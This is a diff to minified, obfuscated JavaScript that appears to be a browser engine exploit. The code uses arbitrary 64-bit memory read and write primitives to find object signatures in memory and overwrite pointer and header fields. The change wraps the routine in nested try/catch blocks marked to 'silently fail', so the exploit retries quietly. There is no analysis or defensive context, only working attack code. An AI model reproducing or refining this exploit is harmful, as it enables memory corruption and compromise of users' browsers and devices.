@@ -1021,47 +1021,55 @@ async function q(t, e) {
           return [e, n, r];
         };
         const U = () => {
-          for (let t = -0x1800n; t > -0x3000n; t -= 0x8n) {
-            let n;
-            try {
-              n = BigInt(b) - t;
-            } catch (e) {
-              continue;
+          try {
+            for (let t = -0x1800n; t > -0x3000n; t -= 0x8n) {
+              let n;
+              try {
+                n = BigInt(b) - t;
+              } catch (e) {
+                continue;
+              }
+              try {
+                if (e.read64(n) == 0xfffe000000055432n && e.read64(n + 0x8n * 2n) == 0xfffe000000055432n && e.read64(n + 0x8n * 3n) == 0xfffe0000000ff432n && e.read64(n + 0x8n * 5n) == 0xfffe0000000ff432n) {
+                  o("");
+                  const t = e.read64(n + 0x8n * 1n);
+                  const r = e.read64(t + 0x8n);
+                  o("");
+                  const i = e.read64(n + 0x8n * 4n);
+                  const s = e.read64(i + 0x8n);
+                  o("");
+                  o("");
+                  o("");
+                  o("");
+                  const l = e.read64(r);
+                  o("");
+                  const h = e.read64(l + rt(tt[w]));
+                  o("");
+                  const a = h + rt(tt[c]);
+                  o("");
+                  const f = e.read64(r + 0x8n);
+                  o("");
+                  const p = e.read64(f + rt(tt[w]));
+                  o("");
+                  const m = p + rt(tt[c]);
+                  o("");
+                  e.write64(p + rt(tt[u]), 0x8000000000000000n);
+                  e.write64(h + rt(tt[u]), 0x8000000000000000n);
+                  e.write64(a, m);
+                  e.write64(s + 0x0n, p);
+                  e.write64(s + 0x8n, m);
+                  e.write64(s + 0x10n, h);
+                  e.write64(s + 0x18n, a);
+                  e.write64(s + 0x20n, t);
+                  e.write64(s + 0x28n, 0x0n);
+                  return;
+                }
+              } catch (innerErr) {
+                continue;
+              }
             }
-            if (e.read64(n) == 0xfffe000000055432n && e.read64(n + 0x8n * 2n) == 0xfffe000000055432n && e.read64(n + 0x8n * 3n) == 0xfffe0000000ff432n && e.read64(n + 0x8n * 5n) == 0xfffe0000000ff432n) {
-              o("");
-              const t = e.read64(n + 0x8n * 1n);
-              const r = e.read64(t + 0x8n);
-              o("");
-              const i = e.read64(n + 0x8n * 4n);
-              const s = e.read64(i + 0x8n);
-              o("");
-              o("");
-              o("");
-              o("");
-              const l = e.read64(r);
-              o("");
-              const h = e.read64(l + rt(tt[w]));
-              o("");
-              const a = h + rt(tt[c]);
-              o("");
-              const f = e.read64(r + 0x8n);
-              o("");
-              const p = e.read64(f + rt(tt[w]));
-              o("");
-              const m = p + rt(tt[c]);
-              o("");
-              e.write64(p + rt(tt[u]), 0x8000000000000000n);
-              e.write64(h + rt(tt[u]), 0x8000000000000000n);
-              e.write64(a, m);
-              e.write64(s + 0x0n, p);
-              e.write64(s + 0x8n, m);
-              e.write64(s + 0x10n, h);
-              e.write64(s + 0x18n, a);
-              e.write64(s + 0x20n, t);
-              e.write64(s + 0x28n, 0x0n);
-              return;
-            }
+          } catch (outerErr) {
+            // Silently fail
           }
           self.setTimeout(U, 10);
         };
